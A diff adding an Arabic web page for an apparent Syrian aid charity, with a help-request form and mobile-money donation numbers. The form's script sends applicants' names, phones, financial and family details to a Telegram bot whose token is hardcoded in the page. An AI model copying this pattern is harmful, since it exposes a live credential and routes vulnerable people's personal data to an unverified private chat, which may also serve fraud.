@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>منظمة أمل الإنسانية</title>
+
+<style>
+body{
+margin:0;
+font-family:Tahoma, Arial;
+direction:rtl;
+background:#0b1220;
+color:#e5e7eb;
+}
+
+header{
+background:linear-gradient(135deg,#111827,#0d6efd);
+color:white;
+text-align:center;
+padding:50px 20px;
+}
+
+header h1{margin:0;font-size:34px;}
+header p{opacity:0.85;margin-top:10px}
+
+nav{
+background:#111827;
+text-align:center;
+padding:12px;
+border-bottom:1px solid #1f2937;
+}
+
+nav a{
+color:#e5e7eb;
+margin:12px;
+text-decoration:none;
+font-weight:bold;
+}
+
+.container{
+max-width:1000px;
+margin:auto;
+padding:20px;
+}
+
+.card{
+background:#111827;
+padding:25px;
+margin:20px 0;
+border-radius:16px;
+box-shadow:0 10px 25px rgba(0,0,0,0.4);
+border:1px solid #1f2937;
+}
+
+h2{color:#4ade80}
+
+.ayah{
+background:#1f2937;
+padding:15px;
+border-radius:12px;
+text-align:center;
+font-weight:bold;
+margin-bottom:15px;
+}
+
+.info{
+background:#0b1220;
+padding:15px;
+border-radius:12px;
+border:1px solid #374151;
+line-height:1.9;
+}
+
+.info p{
+margin:12px 0;
+}
+
+.info ul{
+margin:10px 20px;
+}
+
+.info li{
+margin:6px 0;
+}
+
+/* باقي التصميم بدون تغيير */
+input,select,textarea{
+width:100%;
+padding:13px;
+margin:8px 0;
+border-radius:10px;
+border:1px solid #374151;
+background:#0b1220;
+color:#e5e7eb;
+}
+
+button{
+width:100%;
+padding:14px;
+background:#4ade80;
+color:#0b1220;
+border:none;
+border-radius:10px;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+}
+
+button:hover{background:#22c55e;}
+
+.donate{
+display:flex;
+flex-direction:column;
+gap:15px;
+margin-top:10px;
+}
+
+.donate-box{
+display:flex;
+justify-content:space-between;
+align-items:center;
+background:#0b1220;
+padding:15px;
+border-radius:12px;
+border:1px solid #374151;
+}
+
+.donate-box span{
+color:#60a5fa;
+font-size:16px;
+word-break:break-all;
+}
+
+.donate-box button{
+width:auto;
+padding:8px 14px;
+background:#2563eb;
+color:white;
+}
+
+#success{
+display:none;
+background:#14532d;
+color:#86efac;
+padding:12px;
+margin-top:10px;
+border-radius:10px;
+text-align:center;
+}
+
+footer{
+background:#0b1220;
+text-align:center;
+padding:25px;
+border-top:1px solid #1f2937;
+color:#9ca3af;
+}
+</style>
+
+<script>
+function copyText(text){
+navigator.clipboard.writeText(text);
+alert("✔ تم النسخ");
+}
+
+function send(){
+
+let name=document.getElementById("name").value.trim();
+let lname=document.getElementById("lname").value.trim();
+let phone=document.getElementById("phone").value.trim();
+let city=document.getElementById("city").value;
+let social=document.getElementById("social").value;
+let money=document.getElementById("money").value;
+let gender=document.getElementById("gender").value;
+let details=document.getElementById("details").value.trim();
+
+if(!name || !phone || !details){
+alert("يرجى تعبئة الحقول الأساسية");
+return;
+}
+
+let message=
+`📩 طلب جديد - منظمة أمل الإنسانية
+-----------------------
+👤 الاسم: ${name}
+👤 الكنية: ${lname}
+📱 الهاتف: ${phone}
+🏙 المدينة: ${city}
+👥 الحالة الاجتماعية: ${social}
+💰 الحالة المادية: ${money}
+⚧ الجنس: ${gender}
+📝 التفاصيل: ${details}`;
+
+let token="8737168252:AAHTAF3an2mPFY2xM-oZxIlSibGquSifbMc";
+let chat_id="8414508577";
+
+fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({chat_id:chat_id,text:message})
+});
+
+document.getElementById("success").style.display="block";
+}
+</script>
+
+</head>
+
+<body>
+
+<header>
+<h1>منظمة أمل الإنسانية</h1>
+<p>دعم العائلات المحتاجة داخل سوريا</p>
+</header>
+
+<nav>
+<a href="#about">عن المنظمة</a>
+<a href="#request">طلب مساعدة</a>
+<a href="#donate">التبرع</a>
+</nav>
+
+<div class="container">
+
+<!-- من نحن (بعد التنسيق فقط) -->
+<div class="card" id="about">
+
+<div class="ayah">
+﴿لَنْ تَنَالُوا الْبِرَّ حَتّىٰ تُنفِقُوا مِمَّا تُحِبُّونَ﴾
+</div>
+
+<h2>من نحن</h2>
+
+<div class="info">
+
+<p><strong>منظمة أمل الإنسانية</strong> هي منظمة غير ربحية تأسست عام 2017، وتعمل من تركيا ضمن مشاريع إنسانية داخل سوريا.</p>
+
+<p>تسعى المنظمة إلى تقديم الدعم الإغاثي والمالي والغذائي للعائلات المحتاجة والمتضررة من الظروف الإنسانية الصعبة، مع التركيز على المناطق الأكثر احتياجاً.</p>
+
+<p><strong>نعمل على:</strong></p>
+<ul>
+<li>دعم الأسر الفقيرة والنازحة</li>
+<li>تقديم المساعدات الغذائية الأساسية</li>
+<li>دعم الحالات الإنسانية العاجلة</li>
+<li>تحسين الظروف المعيشية قدر الإمكان</li>
+</ul>
+
+<p>رؤيتنا هي بناء مجتمع أكثر استقراراً وإنسانية، قائم على التكافل والمساعدة المستمرة.</p>
+
+<p style="text-align:center;font-weight:bold;">
+© جميع الحقوق محفوظة لمنظمة أمل الإنسانية 2017 - 2026
+</p>
+
+</div>
+
+</div>
+
+<!-- باقي الموقع كما هو -->
+<div class="card" id="request">
+
+<h2>طلب مساعدة</h2>
+
+<input id="name" placeholder="اسمك">
+<input id="lname" placeholder="كنيتك">
+<input id="phone" placeholder="رقم الهاتف">
+
+<select id="city">
+<option>اختر مدينتك</option>
+<option>دمشق</option>
+<option>ريف دمشق</option>
+<option>حلب</option>
+<option>حمص</option>
+<option>حماة</option>
+<option>اللاذقية</option>
+<option>طرطوس</option>
+<option>دير الزور</option>
+<option>الرقة</option>
+<option>الحسكة</option>
+<option>درعا</option>
+<option>السويداء</option>
+<option>إدلب</option>
+</select>
+
+<select id="social">
+<option>الحالة الاجتماعية</option>
+<option>أعزب</option>
+<option>متزوج</option>
+<option>مطلق</option>
+<option>أرمل</option>
+</select>
+
+<select id="money">
+<option>الحالة المادية</option>
+<option>فقير جداً</option>
+<option>فقير</option>
+<option>متوسط</option>
+<option>جيد</option>
+</select>
+
+<select id="gender">
+<option>الجنس</option>
+<option>ذكر</option>
+<option>أنثى</option>
+</select>
+
+<textarea id="details" placeholder="تفاصيل عنك"></textarea>
+
+<button onclick="send()">إرسال الطلب</button>
+
+<div id="success">✔ تم إرسال طلبك وسيتم مراجعته</div>
+
+</div>
+
+<div class="card" id="donate">
+<h2>التبرع</h2>
+
+<div class="donate">
+
+<div class="donate-box">
+<div>
+💳 شام كاش<br>
+<span>0a1e7cad072137d7655210d125241c9f</span>
+</div>
+<button onclick="copyText('0a1e7cad072137d7655210d125241c9f')">نسخ</button>
+</div>
+
+<div class="donate-box">
+<div>
+📱 سيريتل كاش<br>
+<span>53139330</span>
+</div>
+<button onclick="copyText('53139330')">نسخ</button>
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<footer>
+© 2026 منظمة أمل الإنسانية | جميع الحقوق محفوظة
+</footer>
+
+</body>
+</html>
+  </html>
